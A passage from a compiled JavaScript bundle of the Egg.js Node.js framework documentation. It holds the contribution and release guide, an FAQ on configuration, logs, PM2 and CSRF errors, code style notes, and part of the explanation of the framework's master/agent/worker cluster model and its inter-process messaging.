All demos should be compiled at `,paraId:7,tocIndex:2},{value:"eggjs/examples",paraId:7,tocIndex:2},{value:" repository.",paraId:7,tocIndex:2},{value:"Please provide essential urls, such as application process, terminology explainations and references.",paraId:7,tocIndex:2},{value:"If you are developer of egg repo and you are willing to contribute, feel free to create a new branch, finish your modification and submit a PR. Egg group will review your work and merge it to master branch.",paraId:8,tocIndex:4},{value:`# Create a new branch for development. The name of branch should be semantic, avoiding words like 'update' or 'tmp'. We suggest to use feature/xxx, if the modification is about to implement a new feature.
$ git checkout -b branch-name

# Run the test after you finish your modification. Add new test cases or change old ones if you feel necessary
$ npm test

# If your modification pass the tests, congradulations it's time to push your work back to us. Notice that the commit message should be wirtten in the following format.
$ git add . # git add -u to delete files
$ git commit -m "fix(role): role.use must xxx"
$ git push origin branch-name
`,paraId:9,tocIndex:4},{value:"Then you can create a Pull Request at ",paraId:10,tocIndex:4},{value:"egg",paraId:10,tocIndex:4},{value:"No one can garantee how much will be remembered about certain PR after some time. To make sure we can easily recap what happened previously, please provide the following information in your PR.",paraId:11,tocIndex:4},{value:"Need: What function you want to achieve (Generally, please point out which issue is related).",paraId:12,tocIndex:4},{value:"Updating Reason: Different with issue. Briefly describe your reason and logic about why you need to make such modification.",paraId:12,tocIndex:4},{value:"Related Testing: Briefly descirbe what part of testing is relevant to your modification.",paraId:12,tocIndex:4},{value:"User Tips: Notice for Egg users. You can skip this part, if the PR is not about update in API or potential compatibility problem.",paraId:12,tocIndex:4},{value:"Eslint can help to identify styling issues that may exist in your code. Your code is required to pass the test from eslint. Run the test locally by ",paraId:13,tocIndex:5},{value:"$ npm run lint",paraId:13,tocIndex:5},{value:".",paraId:13,tocIndex:5},{value:"You are encouraged to use ",paraId:14,tocIndex:6},{value:"angular commit-message-format",paraId:14,tocIndex:6},{value:" to write commit message. In this way, we could have a more trackable history and an automatically generated changelog.",paraId:14,tocIndex:6},{value:`<type>(<scope>): <subject>
<BLANK LINE>
<body>
<BLANK LINE>
<footer>
`,paraId:15,tocIndex:6},{value:"\uFF081\uFF09type",paraId:16,tocIndex:6},{value:"Must be one of the following:",paraId:17,tocIndex:6},{value:"feat: A new feature",paraId:18,tocIndex:6},{value:"fix: A bug fix",paraId:18,tocIndex:6},{value:"docs: Documentation-only changes",paraId:18,tocIndex:6},{value:"style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)",paraId:18,tocIndex:6},{value:"refactor: A code change that neither fixes a bug nor adds a feature",paraId:18,tocIndex:6},{value:"perf: A code change that improves performance",paraId:18,tocIndex:6},{value:"test: Adding missing tests",paraId:18,tocIndex:6},{value:"chore: Changes to the build process or auxiliary tools and libraries such as documentation generation",paraId:18,tocIndex:6},{value:"deps: Updates about dependencies",paraId:18,tocIndex:6},{value:"\uFF082\uFF09scope",paraId:19,tocIndex:6},{value:"The scope could be anything specifying place of the commit change. For example $location, $browser, $compile, $rootScope, ngHref, ngClick, ngView, etc...",paraId:20,tocIndex:6},{value:"\uFF083\uFF09subject",paraId:21,tocIndex:6},{value:"Use succinct words to describe what did you do in the commit change.",paraId:22,tocIndex:6},{value:"\uFF084\uFF09body",paraId:23,tocIndex:6},{value:"Feel free to add more content in the body, if you think subject is not self-explanatory enough, such as what it is the purpose or reasone of you commit.",paraId:24,tocIndex:6},{value:"\uFF085\uFF09footer",paraId:25,tocIndex:6},{value:"If the commit is a Breaking Change, please note it clearly in this part.",paraId:26,tocIndex:6},{value:"related issues, like ",paraId:26,tocIndex:6},{value:"Closes #1, Closes #2, #3",paraId:26,tocIndex:6},{value:"If there is a change about an old feaure or a new feature, please associate ",paraId:26,tocIndex:6},{value:"doc",paraId:26,tocIndex:6},{value:" and ",paraId:26,tocIndex:6},{value:"egg-core",paraId:26,tocIndex:6},{value:", like ",paraId:26,tocIndex:6},{value:"eggjs/egg-core#123",paraId:26,tocIndex:6},{value:"e.g.",paraId:27,tocIndex:6},{value:`fix($compile): [BREAKING_CHANGE] couple of unit tests for IE9

Older IEs serialize html uppercased, but IE9 does not...
Would be better to expect case insensitive, unfortunately jasmine does
not allow to user regexps for throw expectations.

Document change on eggjs/egg#123

Closes #392

BREAKING CHANGE:

  Breaks foo.bar api, foo.baz should be used instead
`,paraId:28,tocIndex:6},{value:"Look at ",paraId:29,tocIndex:6},{value:"these files",paraId:29,tocIndex:6},{value:" for more details.",paraId:29,tocIndex:6},{value:"We follow the normal principles of English articles when translating, however, due to there're some special principles of titles, we should follow these rules:",paraId:30,tocIndex:7},{value:"For nouns, verbs, pronouns, adjectives and adverbs, capitalize the first character. For prepsitions, articles, conjections, interjections and auxiliary words, the first character should be in lowercase. ",paraId:31,tocIndex:7},{value:"the character of the first word and the last word for title should be capitalized, regardless of what it is",paraId:31,tocIndex:7},{value:".",paraId:31,tocIndex:7},{value:"For proper nouns such as the direct reference of a variable or the name of a plugin, we must use backtick (underneath the 'Esc') to surround them and keep what they are in origin.",paraId:31,tocIndex:7},{value:"For prepsitions more than 5 characters, their first characters should be also capitalized, otherwise not.",paraId:31,tocIndex:7},{value:"For some very important titles or some fixed proper nouns such as methods of Http: POST,GET,PUT,DELETE, every charater can be capitalized (USE WITH CAUTION).",paraId:31,tocIndex:7},{value:`If the article belongs to the form of O-V (Object-Verb) such as "Config Management", we'd better translate it as "Management Configuration", or "Managing Configuration" in the form of "gerund+noun".`,paraId:31,tocIndex:7},{value:"If your title is taken as a sentence, write in 'Sentence Case' (e.g: In FAQ, each title is actually an English sentence).",paraId:31,tocIndex:7},{value:"For more info, please refer ",paraId:32,tocIndex:7},{value:"English Title Case",paraId:32,tocIndex:7},{value:".",paraId:32,tocIndex:7},{value:"Egg uses semantic versioning in release process based on ",paraId:33,tocIndex:8},{value:"semver",paraId:33,tocIndex:8},{value:".",paraId:33,tocIndex:8},{value:"master",paraId:34,tocIndex:9},{value:" branch is the latest stable version. ",paraId:34,tocIndex:9},{value:"next",paraId:34,tocIndex:9},{value:" branch is the next stable version working in progress.",paraId:34,tocIndex:9},{value:"All new features will be added into ",paraId:35,tocIndex:9},{value:"master",paraId:35,tocIndex:9},{value:" or ",paraId:35,tocIndex:9},{value:"next",paraId:35,tocIndex:9},{value:" branch as well as all bug-fix except security issues. In such way, we can motivate developers to update to the latest stable version.",paraId:35,tocIndex:9},{value:"If any API is discarded, it should be noted with ",paraId:35,tocIndex:9},{value:"deprecate",paraId:35,tocIndex:9},{value:" in current stable version. The old version of API should be compatiable until the release of next stable version.",paraId:35,tocIndex:9},{value:"master",paraId:35,tocIndex:9},{value:" branch doesn't have publish tag. High-level framework can work with stable versions defined by semantic versioning.",paraId:35,tocIndex:9},{value:"next",paraId:35,tocIndex:9},{value:" branch is labelled with ",paraId:35,tocIndex:9},{value:"next",paraId:35,tocIndex:9},{value:" tag, high-level framework can use ",paraId:35,tocIndex:9},{value:"egg@next",paraId:35,tocIndex:9},{value:" to test the in-progress version.",paraId:35,tocIndex:9},{value:"The LTS versions of Egg determined by Milestone. If a version is listed in Milestone, then it is a LTS version. We will patch it if there is any problem with it.",paraId:35,tocIndex:9},{value:"In the release of every stable version, there will be a PM who has the following responsibilities in different stages of the release.",paraId:36,tocIndex:10},{value:"Set up milestone. Confirm that request is related to milestone. Assign and update issues, like ",paraId:37,tocIndex:11},{value:"1.x milestone",paraId:37,tocIndex:11},{value:".",paraId:37,tocIndex:11},{value:"Create a ",paraId:37,tocIndex:11},{value:"next",paraId:37,tocIndex:11},{value:" branch from ",paraId:37,tocIndex:11},{value:"master",paraId:37,tocIndex:11},{value:" branch and tag it as ",paraId:37,tocIndex:11},{value:"next",paraId:37,tocIndex:11},{value:".",paraId:37,tocIndex:11},{value:"Confirm that performance test is passed and all issues in current Milestone are either closed or can be delayed to later versions.",paraId:38,tocIndex:12},{value:"Open a new ",paraId:38,tocIndex:12},{value:"Release Proposal MR",paraId:38,tocIndex:12},{value:", and write ",paraId:38,tocIndex:12},{value:"History",paraId:38,tocIndex:12},{value:" as ",paraId:38,tocIndex:12},{value:"node CHANGELOG",paraId:38,tocIndex:12},{value:`. Don't forget to correct content in documentation which is related to the releasing version. Commits can be generated automatically.
`,paraId:38,tocIndex:12},{value:`$ npm run commits
`,paraId:39,tocIndex:12},{value:"Nominate PM for next stable version.",paraId:38,tocIndex:12},{value:"Back up the stable version (master) onto the branch named after the current major (e.g: ",paraId:40,tocIndex:13},{value:"1.x",paraId:40,tocIndex:13},{value:"), and set the tag to ",paraId:40,tocIndex:13},{value:"release-{v}.x",paraId:40,tocIndex:13},{value:" (v is the current version like ",paraId:40,tocIndex:13},{value:"release-1.x",paraId:40,tocIndex:13},{value:").",paraId:40,tocIndex:13},{value:"Push the ",paraId:40,tocIndex:13},{value:"next",paraId:40,tocIndex:13},{value:" branch to ",paraId:40,tocIndex:13},{value:"master",paraId:40,tocIndex:13},{value:", make it to the last stable one and remove ",paraId:40,tocIndex:13},{value:"next",paraId:40,tocIndex:13},{value:" tag, change the contents corresponding to the branch in README.",paraId:40,tocIndex:13},{value:"Publish the latest stable version to ",paraId:40,tocIndex:13},{value:"npm",paraId:40,tocIndex:13},{value:", and notify the previous framework to be upgraded.",paraId:40,tocIndex:13},{value:"Before doing ",paraId:40,tocIndex:13},{value:"npm publish",paraId:40,tocIndex:13},{value:", please read ",paraId:40,tocIndex:13},{value:"How to deploy an npm package",paraId:40,tocIndex:13},{value:".",paraId:40,tocIndex:13},{value:"All tags mentioned above means the tags of npm in ",paraId:41,tocIndex:13},{value:"package.json",paraId:41,tocIndex:13},{value:".",paraId:41,tocIndex:13},{value:`"publishConfig": {
  "tag": "next"
}
`,paraId:42,tocIndex:13}]},87512:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(10983);const t=[{value:"If you have questions that is not contained below, please check ",paraId:0},{value:"Egg issues",paraId:0},{value:".",paraId:0},{value:"Thank you for reporting an issue.",paraId:1,tocIndex:0},{value:"It's RECOMMENDED to submit PR for typo or tiny bug fix.",paraId:2,tocIndex:0},{value:"If this's a FEATURE request, please provide: details, pseudo-codes if necessary.",paraId:2,tocIndex:0},{value:"If this's a BUG, please provide: course repetition, error log and configuration. Fill in as much of the template below as you're able.",paraId:2,tocIndex:0},{value:"It will be nice to use ",paraId:2,tocIndex:0},{value:"npm init egg --type=simple bug",paraId:2,tocIndex:0},{value:" to provide a mini GitHub repository which can reproduce the issue.",paraId:2,tocIndex:0},{value:"Most importantly, please understand one thing: the relationship between the ",paraId:3,tocIndex:0},{value:"user",paraId:3,tocIndex:0},{value:" and ",paraId:3,tocIndex:0},{value:"the maintainer of open source project",paraId:3,tocIndex:0},{value:" is not ",paraId:3,tocIndex:0},{value:"Buyer",paraId:3,tocIndex:0},{value:" and ",paraId:3,tocIndex:0},{value:"Seller",paraId:3,tocIndex:0},{value:`, the issue is not a customer order either.
When you're opening an issue, please hold a mentality of "working together to solve this problem." Do not expect us to serve you unilaterally.`,paraId:3,tocIndex:0},{value:"Framework ",paraId:4,tocIndex:1},{value:"Config",paraId:5,tocIndex:1},{value:" settings is powerfull, support different environments and different places(framework, plugins, app).",paraId:4,tocIndex:1},{value:"When you got some trouble, and want to find out what is the final config using at runtime, you can checkout ",paraId:6,tocIndex:1},{value:"${root}/run/application_config.json",paraId:6,tocIndex:1},{value:"(workers' configurations) and ",paraId:6,tocIndex:1},{value:"${root}/run/agent_config.json",paraId:6,tocIndex:1},{value:"(agent's configurations).(",paraId:6,tocIndex:1},{value:"root",paraId:6,tocIndex:1},{value:" is application's root directory, in ",paraId:6,tocIndex:1},{value:"local",paraId:6,tocIndex:1},{value:" and ",paraId:6,tocIndex:1},{value:"unittest",paraId:6,tocIndex:1},{value:" environments, it will be project base directory, in other environments will be HOME directory)",paraId:6,tocIndex:1},{value:"Please make sure you don't make a mistake like the code below:",paraId:7,tocIndex:1},{value:`// config/config.default.js
exports.someKeys = 'abc';
module.exports = (appInfo) => {
  const config = {};
  config.keys = '123456';
  return config;
};
`,paraId:8,tocIndex:1},{value:"By default, logs will print at ",paraId:9,tocIndex:2},{value:"${baseDir}/logs",paraId:9,tocIndex:2},{value:"(baseDir is project's base directory) in the local environment. But in non-development environments(neither local nor unittest), the logs will print at ",paraId:9,tocIndex:2},{value:"$HOME/logs",paraId:9,tocIndex:2},{value:"(such as ",paraId:9,tocIndex:2},{value:"/home/admin/logs",paraId:9,tocIndex:2},{value:"). So the logs won't mix in during development and locate in the same place when run in production environment.",paraId:9,tocIndex:2},{value:"PM2",paraId:10},{value:"PM2",paraId:11,tocIndex:3},{value:" itself is too complex to issue problems if any.",paraId:11,tocIndex:3},{value:"Deep optimization could be difficult to achieve if choosing PM2.",paraId:11,tocIndex:3},{value:"Pattern like one leader process communicating with remote services, along with several follower processes delegating the request to it (",paraId:11,tocIndex:3},{value:"Cluster",paraId:12,tocIndex:3},{value:"), is a rigid demand for reducing connections and data exchange load, especially when facing applications in very large scale. egg originates from Ant Financial Group and Alibaba Group, we start with applications in that scale at first, so we take these goals into consideration. All of these goals above could be hard to achieve with PM2.",paraId:11,tocIndex:3},{value:"Process management is very important. It defines the way we write code, meanwhile relates to deep runtime optimizations. So we think it's better included in the framework itself.",paraId:13,tocIndex:3},{value:"How to start application with PM2?",paraId:14,tocIndex:3},{value:"Although PM2 is not recommended, you can use it anyway.",paraId:15,tocIndex:3},{value:"Firstly, put a start file in the root directory of your project:",paraId:16,tocIndex:3},{value:`// server.js
const egg = require('egg');

const workers = Number(process.argv[2] || require('os').cpus().length);
egg.startCluster({
  workers,
  baseDir: __dirname,
});
`,paraId:17,tocIndex:3},{value:"We can start the application with PM2 like this:",paraId:18,tocIndex:3},{value:`pm2 start server.js
`,paraId:19,tocIndex:3},{value:"csrf",paraId:10},{value:"There are two kinds of common csrf errors:",paraId:20,tocIndex:4},{value:"missing csrf token",paraId:21,tocIndex:4},{value:"invalid csrf token",paraId:21,tocIndex:4},{value:"By default ",paraId:22,tocIndex:4},{value:"egg-security",paraId:22,tocIndex:4},{value:" plugin built in Egg requires CSRF validation against all 'unsafe' request such as ",paraId:22,tocIndex:4},{value:"POST",paraId:22,tocIndex:4},{value:", ",paraId:22,tocIndex:4},{value:"PUT",paraId:22,tocIndex:4},{value:", ",paraId:22,tocIndex:4},{value:"DELETE",paraId:22,tocIndex:4},{value:" requests.",paraId:22,tocIndex:4},{value:"The error will disappear in the presence of the correct csrf token in the request. For more implementation details, see [../core/security.md#csrf].",paraId:23,tocIndex:4},{value:"Usually this happens when you are using Jetbrains softwares(IntelliJ IDEA, WebStorm, etc.) with ",paraId:24,tocIndex:5},{value:"Safe Write",paraId:24,tocIndex:5},{value:" turned on.",paraId:24,tocIndex:5},{value:"According to Jetbrains ",paraId:25,tocIndex:5},{value:"Safe Write document",paraId:25,tocIndex:5},{value:":",paraId:25,tocIndex:5},{value:"If this check box is selected, a changed file is first saved in a temporary file. If the save operation succeeds, the file being saved is replaced with the saved file. (Technically, the original file is deleted and the temporary file is renamed.)",paraId:26,tocIndex:5},{value:"Renaming files leads to file watching failure. The solution is simple: just turn of ",paraId:27,tocIndex:5},{value:"Safe Write",paraId:27,tocIndex:5},{value:' option. (Settings | Appearance & Behavior | System Settings | Use "safe write", the path may vary in different versions)',paraId:27,tocIndex:5}]},57257:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(40926);const t=[{value:`Frameworks
`,paraId:0,tocIndex:0},{value:"aliyun-egg",paraId:1,tocIndex:0},{value:`Tools
`,paraId:0,tocIndex:0},{value:"vscode plugin - eggjs",paraId:2,tocIndex:0},{value:"vscode plugin - eggjs-dev-tools",paraId:2,tocIndex:0},{value:`Others
`,paraId:0,tocIndex:0},{value:"awesome-egg",paraId:3,tocIndex:0},{value:`Articles
`,paraId:0,tocIndex:0},{value:"How to evaluate Ali's open source enterprise-level Node.js framework Egg?",paraId:4,tocIndex:0},{value:" By ",paraId:4,tocIndex:0},{value:"@day pig",paraId:4,tocIndex:0},{value:"You can also read our article at ",paraId:4,tocIndex:0},{value:"Kuroshiami column",paraId:4,tocIndex:0}]},3753:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(60373);const t=[{value:"Developers are advised to use ",paraId:0},{value:"npm init egg --type=simple showcase",paraId:0},{value:" to generate and observe the recommended project structure and configuration.",paraId:0},{value:"Old Style:",paraId:1,tocIndex:0},{value:`module.exports = (app) => {
  class UserService extends app.Service {
    async list() {
      return await this.ctx.curl('https://eggjs.org');
    }
  }
  return UserService;
};
`,paraId:2,tocIndex:0},{value:"change to:",paraId:3,tocIndex:0},{value:`const Service = require('egg').Service;
class UserService extends Service {
  async list() {
    return await this.ctx.curl('https://eggjs.org');
  }
}
module.exports = UserService;
`,paraId:4,tocIndex:0},{value:"Additionally, the ",paraId:5,tocIndex:0},{value:"framework developer",paraId:5,tocIndex:0},{value:" needs to change the syntax as follows, otherwise the ",paraId:5,tocIndex:0},{value:"application developer",paraId:5,tocIndex:0},{value:" will have problems customizing base classes such as Service:",paraId:5,tocIndex:0},{value:`const egg = require('egg');

module.exports = Object.assign(egg, {
  Application: class MyApplication extends egg.Application {
    // ...
  },
  // ...
});
`,paraId:6,tocIndex:0},{value:"Private properties are mounted with ",paraId:7,tocIndex:1},{value:"Symbol",paraId:7,tocIndex:1},{value:".",paraId:7,tocIndex:1},{value:"The description of Symbol follows the rules of jsdoc, describing the mapped class name + attribute name.",paraId:7,tocIndex:1},{value:"Delayed initialization.",paraId:7,tocIndex:1},{value:`// app/extend/application.js
const CACHE = Symbol('Application#cache');
const CacheManager = require('../../lib/cache_manager');

module.exports = {
  get cache() {
    if (!this[CACHE]) {
      this[CACHE] = new CacheManager(this);
    }
    return this[CACHE];
  },
};
`,paraId:8,tocIndex:1}]},56261:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(75666);const t=[{value:"We know that JavaScript codes are run on single thread, in other words, one Node.js process only runs on one CPU. So if we use Node.js as a Web Server, we cannot benefit from multi-core any more. As an enterprise-level solution, one problem that must be solved is:",paraId:0},{value:"how to squeeze all server resources, taking advantages of multi-cores?",paraId:1},{value:"And the official solution provided by Node.js is ",paraId:2},{value:"Cluster module",paraId:2},{value:", and there's an introduction:",paraId:2},{value:"A single instance of Node.js runs in a single thread. To take advantage of multi-core systems the user will sometimes want to launch a cluster of Node.js processes to handle the load.",paraId:3},{value:"The cluster module allows you to easily create child processes that all share server ports.",paraId:4},{value:"In short,",paraId:5,tocIndex:0},{value:"fork multiple processes on the server concurrently.",paraId:6,tocIndex:0},{value:"every single process runs the same source code(just like assigning work done by one process to multiple processes).",paraId:6,tocIndex:0},{value:"what is more, all these processes can listen on the same one port(for detailed mechanism referring to @DavidCai1993 ",paraId:6,tocIndex:0},{value:"Cluster Implementation Mechanism",paraId:6,tocIndex:0},{value:")",paraId:6,tocIndex:0},{value:"of which:",paraId:7,tocIndex:0},{value:"the process that forks other processes is called Master process, it seems like a contractor that does nothing except forking other processes.",paraId:8,tocIndex:0},{value:"other forked processes are called Worker processes, as the name suggests, they are workers that work actually. They accept requests and provide services.",paraId:8,tocIndex:0},{value:"usually the number of Worker processes depends on the CPU core number, only in this way can we take full advantage of multi-core resources.",paraId:8,tocIndex:0},{value:`const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
  // Fork workers.
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', function (worker, code, signal) {
    console.log('worker ' + worker.process.pid + ' died');
  });
} else {
  // Workers can share any TCP connection
  // In this case it is an HTTP server
  http
    .createServer(function (req, res) {
      res.writeHead(200);
      res.end('hello world\\n');
    })
    .listen(8000);
}
`,paraId:9,tocIndex:0},{value:"Simple like the example above, but as an enterprise-level solution, much more remains to be considered.",paraId:10,tocIndex:1},{value:"How to handle the exception that Worker processes exit unexpected?",paraId:11,tocIndex:1},{value:"How to share resources among multiple Worker processes?",paraId:11,tocIndex:1},{value:"How to schedule multiple Worker processes?",paraId:11,tocIndex:1},{value:"...",paraId:11,tocIndex:1},{value:"Haleness(aka Robustness) of an enterprise-level application must be considered, apart from the guarantee of high quality codes of program itself, the framework level should provide the cache-all mechanism to ensure the availability under extreme circumstance.",paraId:12,tocIndex:2},{value:"Generally, Node.js processes exit for two reasons:",paraId:13,tocIndex:2},{value:"The process will exit when codes throw an exception but fail to catch it, at this time, Node.js provides ",paraId:14,tocIndex:3},{value:"process.on('uncaughtException', handler)",paraId:14,tocIndex:3},{value:" interface to catch it, But if a Worker process encounters an uncaught exception, it enters an uncertain state and what we should do is to make it exit elegantly:",paraId:14,tocIndex:3},{value:"close all TCP Servers started by the corrupted Worker process(close all connections and stop accepting new requests), close the IPC channel between Master and do not accept user requests any more.",paraId:15,tocIndex:3},{value:"a new Worker process should be forked by the Master immediately to ensure the total number of workers unchanged.",paraId:15,tocIndex:3},{value:"the corrupted Worker process waits for a while before exit in order to get through accepted requests.",paraId:15,tocIndex:3},{value:`   +---------+                 +---------+
   |  Worker |                 |  Master |
   +---------+                 +----+----+
        | uncaughtException         |
        +------------+              |
        |            |              |                   +---------+
        | <----------+              |                   |  Worker |
        |                           |                   +----+----+
        |        disconnect         |   fork a new worker    |
        +-------------------------> + ---------------------> |
        |         wait...           |                        |
        |          exit             |                        |
        +-------------------------> |                        |
        |                           |                        |
       die                          |                        |
                                    |                        |
                                    |                        |
`,paraId:16,tocIndex:3},{value:"When a process crashes due to exceptions or is killed due to OOM by the OS, we have no chance to resume the process like uncaught exceptions occurring, the only choice is to exit current process directly then Master forks a new Worker immediately.",paraId:17,tocIndex:4},{value:"In the framework, we use ",paraId:18,tocIndex:4},{value:"graceful",paraId:18,tocIndex:4},{value:" and ",paraId:18,tocIndex:4},{value:"egg-cluster",paraId:18,tocIndex:4},{value:" 2 modules correspondingly to implement above logics. This solution has been widely deployed in production environment in Alibaba Cor. and Ant Financial Cor. and is long-tested by 'Double 11' big promotion, solid and reliable.",paraId:18,tocIndex:4},{value:"Up to now, Node.js multi-process solution seems good enough and it's also the solution that we used in production environment previously. But before long, we find that there is some work that should not be done by every Worker in fact, if not, it leads to wasting of resources and, even worse, it may result in conflicts on resource access among processes. For example: we usually archive log file by date in production environment and it is easy to do in single process model:",paraId:19,tocIndex:5},{value:"at 0 o'clock in the morning, rename current log file by date",paraId:20,tocIndex:5},{value:"destroy previous file handle, create new log file and continue writing",paraId:20,tocIndex:5},{value:"Now imagine there are 4 processes doing the same work, and they may get into a mess. So for this kind of background logics, we'd like to run it on a single process which is called Agent Worker, or Agent for short. Agent is something like a 'secretary' for other Worker which is introduced by Master, it does not serve outside but only App Workers, especially processes common affairs. Now our multi-process model becomes something like below:",paraId:21,tocIndex:5},{value:`                  +--------+          +-------+
                  | Master |<-------->| Agent |
                  +--------+          +-------+
                  ^   ^    ^
                 /    |     \\
               /      |       \\
             /        |         \\
           v          v          v
  +----------+   +----------+   +----------+
  | Worker 1 |   | Worker 2 |   | Worker 3 |
  +----------+   +----------+   +----------+
`,paraId:22,tocIndex:5},{value:"And our framework startup sequence looks like:",paraId:23,tocIndex:5},{value:`    +---------+           +---------+          +---------+
    |  Master |           |  Agent  |          |  Worker |
    +---------+           +----+----+          +----+----+
         |      fork agent     |                    |
         +-------------------->|                    |
         |      agent ready    |                    |
         |<--------------------+                    |
         |                     |     fork worker    |
         +----------------------------------------->|
         |     worker ready    |                    |
         |<-----------------------------------------+
         |      Egg ready      |                    |
         +-------------------->|                    |
         |      Egg ready      |                    |
         +----------------------------------------->|
`,paraId:24,tocIndex:5},{value:"Agent process is forked after Mater starts up",paraId:25,tocIndex:5},{value:"when Agent initialized successfully, Master is notified via IPC channel",paraId:25,tocIndex:5},{value:"Master forks many App Workers",paraId:25,tocIndex:5},{value:"when App Worker initialized successfully, Master is notified",paraId:25,tocIndex:5},{value:"when all process initialized successfully, Master notifies Agent and Worker that the application starts up successfully",paraId:25,tocIndex:5},{value:"Besides, there still is something about Agent Worker needing to be notices:",paraId:26,tocIndex:5},{value:"since App Worker depends on Agent, App Worker can be forked only after Agent being initialized",paraId:27,tocIndex:5},{value:"although Agent is the secretary of App Worker, business related work should not be assigned to Agent, or it may be broken down",paraId:27,tocIndex:5},{value:"considering the special orientation of Agent, ",paraId:27,tocIndex:5},{value:"we must ensure it's relatively stable",paraId:27,tocIndex:5},{value:". When it throws an uncaught exception, framework does not shut it down then restart it like App Worker, instead, it logs the exception, gives an alarm and waits for manual handling",paraId:27,tocIndex:5},{value:"mounting API of Agent differs from that of App Worker, and differences are listed in ",paraId:27,tocIndex:5},{value:"Framework docs",paraId:28,tocIndex:5},{value:"You can implement your own logics in ",paraId:29,tocIndex:6},{value:"agent.js",paraId:29,tocIndex:6},{value:" which is under the directory of the application or the plugin(like the usage of ",paraId:29,tocIndex:6},{value:"Customized Startup",paraId:30,tocIndex:6},{value:", and the only difference is using agent object as the entrance parameter)",paraId:29,tocIndex:6},{value:`// agent.js
module.exports = agent => {
  // put your initialization logics here

  // messages can also be sent by the messenger object to App Worker
  // but you should wait until App Worker starts up successfully, or the message may be lost
  agent.messenger.on('egg-ready', () => {
    const data = { ... };
    agent.messenger.sendToApp('xxx_action', data);
  });
};
`,paraId:31,tocIndex:6},{value:`// app.js
module.exports = (app) => {
  app.messenger.on('xxx_action', (data) => {
    // ...
  });
};
`,paraId:32,tocIndex:6},{value:"In this example, codes of ",paraId:33,tocIndex:6},{value:"agent.js",paraId:33,tocIndex:6},{value:" are run in Agent process, codes of ",paraId:33,tocIndex:6},{value:"app.js",paraId:33,tocIndex:6},{value:" are run in the Worker process, and they do the Inter-Process Communication(IPC) through the ",paraId:33,tocIndex:6},{value:"messenger",paraId:33,tocIndex:6},{value:" object encapsulated by framework. Details about the IPC are explained in later sections.",paraId:33,tocIndex:6},{value:"When an application starts up, 3 kinds of processes will be forked.",paraId:34,tocIndex:7},{value:"Type",paraId:35,tocIndex:7},{value:"Number of Processes",paraId:35,tocIndex:7},{value:"Purpose",paraId:35,tocIndex:7},{value:"Stability",paraId:35,tocIndex:7},{value:"Run Business Codes or Not",paraId:35,tocIndex:7},{value:"Master",paraId:35,tocIndex:7},{value:"1",paraId:35,tocIndex:7},{value:"Managing processes and transmitting messages among processes",paraId:35,tocIndex:7},{value:"Very High",paraId:35,tocIndex:7},{value:"No",paraId:35,tocIndex:7},{value:"Agent",paraId:35,tocIndex:7},{value:"1",paraId:35,tocIndex:7},{value:"Running background jobs(persistent connection client)",paraId:35,tocIndex:7},{value:"High",paraId:35,tocIndex:7},{value:"Little",paraId:35,tocIndex:7},{value:"Worker",paraId:35,tocIndex:7},{value:"usually the number of CPU cores",paraId:35,tocIndex:7},{value:"Running Business codes",paraId:35,tocIndex:7},{value:"Normal",paraId:35,tocIndex:7},{value:"Yes",paraId:35,tocIndex:7},{value:"With this model, Master process undertakes the process management workers(like ",paraId:36,tocIndex:8},{value:"pm2",paraId:36,tocIndex:8},{value:") but runs no business codes. We simply start up a Master process and it will handle all initialization and restarting issues of Worker and Agent processes.",paraId:36,tocIndex:8},{value:"Master process is extremely stable. We simply use ",paraId:37,tocIndex:8},{value:"egg-scripts",paraId:37,tocIndex:8},{value:" for online and ",paraId:37,tocIndex:8},{value:"egg.startCluster",paraId:37,tocIndex:8},{value:" for background to start Master process and ",paraId:37,tocIndex:8},{value:"pm2",paraId:37,tocIndex:8},{value:" or other daemon module is no long necessary.",paraId:37,tocIndex:8},{value:`$ egg-scripts start --daemon
`,paraId:38,tocIndex:8},{value:"In most cases, we needn't care about Agent process when writing business codes, but in several cases, where we propose to run the codes in a single process and that is the time we use Agent process.",paraId:39,tocIndex:9},{value:"Since there's only one Agent that is in charge of tough and tedious work like keeping connections, it cannot be hang or restarted rashly. Agent process won't exit when encounters uncaught exceptions, but output an error log instead, ",paraId:40,tocIndex:9},{value:"so we should always keep out eyes on the uncaught exceptions in logs",paraId:40,tocIndex:9},{value:".",paraId:40,tocIndex:9},{value:"Worker process undertakes user requests and ",paraId:41,tocIndex:10},{value:"scheduled tasks",paraId:42,tocIndex:10},{value:" actually. Egg provides scheduled tasks with the ability to be run only in one Worker process, ",paraId:41,tocIndex:10},{value:"so never solve problems by Agent as long as they can be solved by scheduled tasks",paraId:41,tocIndex:10},{value:".",paraId:41,tocIndex:10},{value:"Worker runs business codes, which are more complicated than those of Agent and Master but the stability may be lower, ",paraId:43,tocIndex:10},{value:"a Worker process will be restarted by Master when a Worker process exits unexpectedly",paraId:43,tocIndex:10},{value:".",paraId:43,tocIndex:10},{value:"Although every Worker process runs individually, it's necessary for them to communicate with each other which is called inter-process communication(IPC). Below is an example code provided by Node.js officially.",paraId:44,tocIndex:11},{value:`'use strict';
const cluster = require('cluster');

if (cluster.isMaster) {
  const worker = cluster.fork();
  worker.send('hi there');
  worker.on('message', (msg) => {
    console.log(\`msg: \${msg} from worker#\${worker.id}\`);
  });
} else if (cluster.isWorker) {
  process.on('message', (msg) => {
    process.send(msg);
  });
}
`,paraId:45,tocIndex:11},{value:"Carefully you can see that the IPC channel of clusters exists only between Master and Worker/Agent, not between Worker and Agent. So how to communicate among Workers? Yes, Master helps transmit.",paraId:46,tocIndex:11},{value:`Broadcast messages: agent => all workers
                  +--------+          +-------+
                  | Master |<---------| Agent |
                  +--------+          +-------+
                 /    |     \\
                /     |      \\
               /      |       \\
              /       |        \\
             v        v         v
  +----------+   +----------+   +----------+
  | Worker 1 |   | Worker 2 |   | Worker 3 |
  +----------+   +----------+   +----------+

Specify receivers: one worker => another worker
                  +--------+          +-------+
                  | Master |----------| Agent |
                  +--------+          +-------+
                 ^    |
     send to    /     |
    worker 2   /      |
              /       |
             /        v
  +----------+   +----------+   +----------+
  | Worker 1 |   | Worker 2 |   | Worker 3 |
  +----------+   +----------+   +----------+
